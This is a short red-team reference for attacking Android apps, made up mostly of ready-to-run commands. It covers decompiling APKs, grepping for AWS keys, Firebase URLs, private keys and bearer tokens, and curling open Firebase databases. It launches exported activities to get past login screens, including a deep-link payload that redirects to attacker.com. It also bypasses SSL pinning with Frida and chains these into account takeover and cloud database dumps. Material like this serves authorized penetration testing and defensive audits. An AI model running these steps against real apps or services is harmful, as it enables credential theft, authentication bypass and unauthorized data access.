# Android Security & APK Red Team Reference

## Decompilation & Static Secrets Extraction
1. **Decompilation with JADX**:
   - `jadx -d out/ target.apk --show-bad-code`
   - Reconstruct resources and code: `apktool d target.apk -o apk_unpacked/`
2. **High-Yield Secret Grep Patterns**:
   - Cloud keys: `grep -E 'AKIA[0-9A-Z]{16}' -r out/`
   - Firebase DBs: `grep -E 'https://[a-z0-9-]+\.firebaseio\.com' -r out/` (Test: `curl https://<name>.firebaseio.com/.json`)
   - Unlinked APIs: `grep -Eo '["\']https?://[a-zA-Z0-9.-]+/api/[a-zA-Z0-9/_.-]+["\']' -r out/`
   - Private Keys & Tokens: `grep -E '(BEGIN PRIVATE KEY|bearer [a-zA-Z0-9_.-]{20,})' -r out/`

## Exported Components & Deep Link Exploitation
1. **Exported Activity / Service / Provider Auditing**:
   - Inspect `AndroidManifest.xml` for `android:exported="true"`.
   - Test invoking exported activities directly bypassing login screens:
     `adb shell am start -n com.target.app/.ui.AdminSettingsActivity`
2. **Deep Link / Custom URL Scheme Hijacking**:
   - Find intent filters: `<data android:scheme="myapp" android:host="auth" />`
   - Test sending malicious token payload:
     `adb shell am start -a android.intent.action.VIEW -d "myapp://auth?token=attacker_token&redirect=http://attacker.com"`
3. **WebView `addJavascriptInterface` Bridge**:
   - Search for `@JavascriptInterface` bridge annotations.
   - If WebView loads untrusted HTTP content or enables `setJavaScriptEnabled(true)`, inject JS to invoke native Java methods.

## Network Interception & SSL Pinning Bypass
1. **Universal Frida Hook**:
   - Run Frida server on rooted device/emulator:
     `adb push frida-server /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/frida-server && adb shell /data/local/tmp/frida-server &`
   - Launch application with universal SSL pinning bypass:
     `frida -U -f com.target.app --codeshare pcip/universal-android-ssl-pinning-bypass-with-frida`
2. **Network Security Config Patching (Non-Root)**:
   - Modify `res/xml/network_security_config.xml` in apktool:
     `<trust-anchors><certificates src="user" /></trust-anchors>`
   - Rebuild and resign APK with `uber-apk-signer`.

## Exploit Chains
- **Exported Deep Link Handler → OAuth Token Interception → Pre-Auth Account Takeover**.
- **Hardcoded AWS / Firebase Secret in APK → Unauthenticated Cloud Database Dump**.
